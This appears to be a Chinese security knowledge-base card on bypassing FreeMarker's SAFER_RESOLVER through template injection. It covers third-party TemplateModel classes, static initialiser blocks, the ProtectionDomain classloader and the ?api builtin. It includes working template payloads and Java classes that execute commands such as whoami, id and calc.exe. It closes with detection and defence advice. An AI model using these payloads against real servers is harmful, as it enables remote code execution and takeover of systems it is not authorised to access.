---
id: web-generic-ssti-freemarker-safer-resolver-bypass
title: FreeMarker SAFER_RESOLVER 绕过：第三方 TemplateModel、静态块、ProtectionDomain 与 ?api
type: scenario
domain: web
path: web/generic/ssti
technique: freemarker-safer-resolver-bypass
tags:
- web
- ssti
- freemarker
- java
- template-injection
- rce
- safer-resolver
- classloader
- api-builtin
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V27
  verified_at: '2026-11-05T03:04:42+08:00'
  notes: '已对照原文与截图核对：SAFER_RESOLVER 2.3.17 仅禁 ObjectConstructor、2.3.19 禁三类，第三方 TemplateMethodModel（实测 Executed: whoami）、静态块、ProtectionDomain（实测 usres\user）、api 加 Gson（实测 whoami）均与截图一致。未验证点：第三方类与静态块需目标 classpath 已存在对应类；ProtectionDomain 变体受版本限制。'
url: /docs/web/generic/ssti/web-generic-ssti-freemarker-safer-resolver-bypass/
draft: false
kb_aliases:
- FreeMarker ?new 绕过
- SAFER_RESOLVER bypass
- FreeMarker TemplateMethodModel 绕过
- ProtectionDomain.getClassLoader 绕过
- FreeMarker 静态代码块 RCE
- FreeMarker api_builtin 绕沙箱
- freemarker.template.utility.Execute
---

## 一句话结论

FreeMarker 的 `SAFER_RESOLVER` 只按类名黑名单拦截 `Execute`、`ObjectConstructor`、`JythonRuntime` 三个原生危险类；只要模板上下文里存在任意对象，攻击者仍可通过第三方 `TemplateMethodModel` 实现类、类的静态初始化块、`object.class.protectionDomain.classLoader`（受版本影响）或开启的 `?api` 反射链绕过限制，最终执行命令。

## 原理

- `?new` 内建函数由 `TemplateClassResolver` 决定能实例化哪些类：
  - `UNRESTRICTED_RESOLVER`：任意类；
  - `SAFER_RESOLVER`：按类名拒绝 `freemarker.template.utility.Execute`、`ObjectConstructor`、`JythonRuntime`（v2.3.17 只禁 `ObjectConstructor`，v2.3.19 起三个都禁）；
  - `ALLOWS_NOTHING_RESOLVER`：全部拒绝。
- 黑名单只覆盖三个原生类，因此存在多条绕过：
  1. **第三方/业务 TemplateModel 类**：任何实现 `TemplateMethodModel`（或其它可执行 `TemplateModel`）的类，只要 `exec()` 里有危险行为，就能用 `?new()` 实例化并调用。SAFER_RESOLVER 不拦非原生类。
     ```java
     public class FreemakerSSTI implements TemplateMethodModel {
         public Object exec(List args) {
             Runtime.getRuntime().exec(args.get(0).toString());
             return "Executed: " + args.get(0);
         }
     }
     ```
     Payload：`${"FreemakerSSTI"?new()("whoami")}`。
  2. **静态初始化块**：`?new` 实例化前会先加载类，JVM 执行 `<clinit>`；即使构造函数不可用，静态块里的命令也已经执行。Payload 只需 `<#assign foo="Test"?new()>`。
  3. **ProtectionDomain.getClassLoader（< v2.3.30）**：FreeMarker 的 `unsafeMethods.properties` 黑名单禁用了 `Class.getClassLoader()`，但没有覆盖 `Class.getProtectionDomain().getClassLoader()`。拿到 classloader 后可加载 `ObjectWrapper`，取其 `DEFAULT_WRAPPER`，再用 `newInstance` 实例化 `Execute`。
  4. **?api 开启（api_builtin_enabled=true）**：`object?api` 暴露 Java 原生 API；可用 classloader 加载一个带静态 `Gson` 字段的业务类，通过 `gson?api.fromJson("{}", Execute.class)` 实例化 `Execute`，绕开 `?new` 的类解析。
- 这些绕过成立的根本原因是：模板沙箱默认“模板能访问的对象/类都是可信的”，而 FreeMarker 的类黑名单只覆盖少量原生类；业务 classpath 上的任意可执行类、静态初始化块和反射 API 都可能成为跳板。

## 触发条件

- 存在 FreeMarker 模板注入，攻击者可控制模板内容。
- `SAFER_RESOLVER` 已启用但模板上下文暴露了任意对象（常见 `object`、`user`、`request` 等），或 classpath 上存在可被 `?new` 加载的第三方 `TemplateModel`/带静态块的类。
- 对于 `ProtectionDomain` 绕过：FreeMarker < 2.3.30（原文标注），且 `object` 可访问 `.class`。
- 对于 `?api` 绕过：`Configuration.setAPIBuiltinEnabled(true)`（默认 false），且 classpath 上存在带静态 `Gson`（或类似反序列化工具）字段的类。
- 目标可执行 `Runtime.exec`/反射调用，或可加载攻击者提供的类。

## 利用步骤

1. 确认模板注入与 `?new` 行为：尝试 `${"freemarker.template.utility.Execute"?new()("id")}`，若被 SAFER_RESOLVER 拒绝，说明防护生效。
2. 探测模板上下文对象：`${object?api.class}`（?api 开启时）、`${object.class}`；或在业务 classpath 中寻找实现了 `TemplateMethodModel` 且 `exec` 可执行命令的类。
3. 选择绕过：
   - 第三方类：`${"<类全名>"?new()("<命令>")}`；
   - 静态块：`<#assign x="<类全名>"?new()>`；
   - ProtectionDomain：按下面 PoC 逐级取 classloader、`ObjectWrapper.DEFAULT_WRAPPER`、`Execute`；
   - ?api：加载带静态 Gson 的类，`fromJson` 实例化 `Execute` 后调用。
4. 用 `whoami`/写文件/弹计算器确认命令执行；失败时检查版本、`?api` 开关、类是否在 classpath。

## PoC

第三方 `TemplateMethodModel`：

```java
public class FreemakerSSTI implements freemarker.template.TemplateMethodModel {
    @Override
    public Object exec(java.util.List arguments) {
        try {
            Runtime.getRuntime().exec(arguments.get(0).toString());
        } catch (Exception e) { }
        return "Executed: " + arguments.get(0);
    }
}
```

```text
${"FreemakerSSTI"?new()("whoami")}
```

静态初始化块：

```java
public class Test {
    static {
        try { Runtime.getRuntime().exec("calc.exe"); } catch (Exception e) { }
    }
}
```

```text
<#assign foo="Test"?new()>
```

`ProtectionDomain.getClassLoader`（FreeMarker < 2.3.30，且 `object` 在上下文中）：

```text
<#assign classloader=object.class.protectionDomain.classLoader>
<#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")>
<#assign dwf=owc.getField("DEFAULT_WRAPPER").get(null)>
<#assign ec=classloader.loadClass("freemarker.template.utility.Execute")>
${dwf.newInstance(ec,null)("whoami")}
```

`?api` + Gson 反序列化（`api_builtin_enabled=true`，业务类含静态 `Gson GSON` 字段）：

```text
<#assign classLoader=object?api.class.protectionDomain.classLoader>
<#assign clazz=classLoader.loadClass("org.joychou.controller.ClassExposingGSON")>
<#assign field=clazz?api.getField("GSON")>
<#assign gson=field?api.get(null)>
<#assign ex=gson?api.fromJson("{}", classLoader.loadClass("freemarker.template.utility.Execute"))>
${ex("id")}
```

## 变体与关联

- 变体：任何 `TemplateMethodModel`/`TemplateModel` 实现类都可能成为跳板；审计 classpath 中 `exec`/`invoke`/`eval` 行为的类。
- 变体：静态初始化块不要求类实现任何接口，只要 `?new` 能加载该类即可触发；适合“类存在但无危险构造函数”的情况。
- 变体：`?api` 还可用于文件读取、反射调用、类加载；关闭 `api_builtin_enabled` 可阻断这一支。
- 关联卡片：[[web-generic-ssti-freemarker-classpath-resource-read]]（同一注入面下的 classpath 配置读取）；[[web-java-framework-spring-freemarker-macro-context-resolver-reset]]（通过暴露的 Spring 对象直接重置 resolver 的沙箱逃逸）；[[web-java-component-jimureport-freemarker-jeecg-compute-aviator-rce]]（业务暴露方法把输入交给第二表达式引擎的案例）。
- 边界：`ALLOWS_NOTHING_RESOLVER` 会阻断 `?new` 路径；FreeMarker 2.3.30+ 收紧了 `ProtectionDomain` 等反射面；`?api` 默认关闭；第三方类不在 classpath 或静态块已被裁剪时，相应变体失效。

## 检测与防御

- 检测：模板/请求中出现 `?new`、`protectionDomain`、`getClassLoader`、`ObjectWrapper`、`DEFAULT_WRAPPER`、`?api`、`fromJson`、`TemplateMethodModel` 等组合；应用日志中的 FreeMarker 解析异常与类加载行为；模板渲染后进程派生子进程。
- 防御：FreeMarker 配置 `ALLOWS_NOTHING_RESOLVER` 或严格白名单 `TemplateClassResolver`；不要向模板暴露任意 Java 对象，使用 `TemplateModel` 包装并限制方法；关闭 `api_builtin_enabled`；升级 FreeMarker 到修复版本；禁止模板编辑权限给不可信用户。
- 加固：对模板内容做语法/AST 级检查，拒绝 `?new`、`?api`；把模板引擎放在低权限进程/沙箱中运行；监控 classpath 中可执行的 `TemplateModel` 实现类。
